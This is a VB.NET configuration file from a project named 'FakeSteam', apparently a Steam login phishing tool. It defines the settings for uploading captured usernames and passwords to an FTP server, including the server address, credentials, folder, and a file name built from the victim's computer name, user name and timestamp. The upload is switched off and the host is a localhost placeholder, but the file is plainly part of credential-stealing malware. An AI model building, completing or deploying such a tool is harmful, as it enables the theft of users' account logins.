' ***********************************************************************
' Assembly : FakeSteam
' Author   : Elektro
' Modified : 03-May-2015
' ***********************************************************************
' <copyright file="FtpConfig.vb" company="Elektro Studios">
'     Copyright (c) Elektro Studios. All rights reserved.
' </copyright>
' ***********************************************************************

#Region " Imports "

Imports System.Net

#End Region

Namespace Config

    Partial Public NotInheritable Class UserConfig

#Region " FTP Uploading Configuration "

        ''' <summary>
        ''' If set to <c>True</c>, enables FTP upload of the username/password.
        ''' </summary>
        Public Shared ReadOnly EnableFtp As Boolean = False

        ''' <summary>
        ''' The FTP Server address.
        ''' </summary>
        Public Shared ReadOnly FtpAddress As Uri = New Uri("ftp://127.0.0.1/")

        ''' <summary>
        ''' The FTP server port.
        ''' </summary>
        Public Shared ReadOnly FtpPort As Integer = 21

        ''' <summary>
        ''' The FTP username/password credentials.
        ''' </summary>
        Public Shared ReadOnly FtpCredentials As New NetworkCredential("username", "password")

        ''' <summary>
        ''' The FTP directory where to upload the file.
        ''' The directory path should exist.
        ''' </summary>
        Public Shared ReadOnly FtpDir As String = "Fake Steam/"

        ''' <summary>
        ''' The file name to store the data on the FTP directory.
        ''' By default is "Steam_{ComputerName}_{Username}_{Day}-{Month}-{Year}_{Hour}-{Minute}-{Seconds}.txt"
        ''' </summary>
        Public Shared ReadOnly FtpFilenameFormat As String =
            String.Format("Steam_{0}_{1}_{2}.txt", Environment.MachineName, Environment.UserName, DateTime.Now.ToString("dd-MM-yyyy\_hh-mm-ss"))

        ''' <summary>
        ''' If set to <c>True</c>, uses Binary mode for the file transfer.
        ''' </summary>
        Public Shared ReadOnly UseBinaryTransfer As Boolean = False

#End Region

    End Class

End Namespace